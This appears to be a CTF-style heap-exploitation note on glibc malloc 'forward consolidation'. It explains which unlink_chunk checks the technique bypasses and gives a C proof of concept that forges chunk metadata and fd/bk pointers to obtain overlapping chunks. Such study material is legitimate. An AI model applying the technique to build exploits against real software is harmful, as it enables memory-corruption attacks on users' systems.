## forward consolidation

**Purpose:** We can have two separate chunks allocated to the same space

**Require:** Have an ability to change the metadata of the allocated chunks

**Mitigations need to bypass:** The malloc consolidates 2 chunks using `malloc_consolidate` function, but before consolidate them, malloc must unlink (use `unlink_chunk`) first. And there are two mitigations inside the `unlink_chunk` that we need to bypass

    - [prev_size](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L1610-L1611)
    - [fd/bk](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L1616-L1617)

## POC

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    long *victim, *consolidated_chunk, *chunk2;

    victim = malloc(0x410);
    consolidated_chunk = malloc(0x80);
    chunk2 = malloc(0x10); // Avoid top-chunk consolidate

    /* Setup consolidated_chunk->next prev_size & size fields */
    chunk2[-2] = 0x90;
    chunk2[-1] = 0x20;

    /* Create a FAKE main_arena */
    consolidated_chunk[8] = (long)&consolidated_chunk[-2];
    consolidated_chunk[9] = (long)&consolidated_chunk[-2];

    /* Create a FAKE fd/bk */
    consolidated_chunk[0] = (long)&consolidated_chunk[6];
    consolidated_chunk[1] = (long)&consolidated_chunk[6];

    free(victim);
    // After this, our victim chunk would be freed, and due to fwd consolidation it will be merged with the consolidated_chunk
    // This create an overlapping chunk on a 0x90 (include metadata) chunk
    long *new_chunk = malloc(0x410);
    long *overlaping_chunk = malloc(0x80);

    // Confirm again
    assert(overlaping_chunk == consolidated_chunk);

    return 0;
}
```

## Reference

- https://github.com/lieuhoaisa/CTFnotes/blob/main/heap/primitives/malloc/foward_consolidation/readme.md
- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/malloc/fwd_consolidation/readme.md
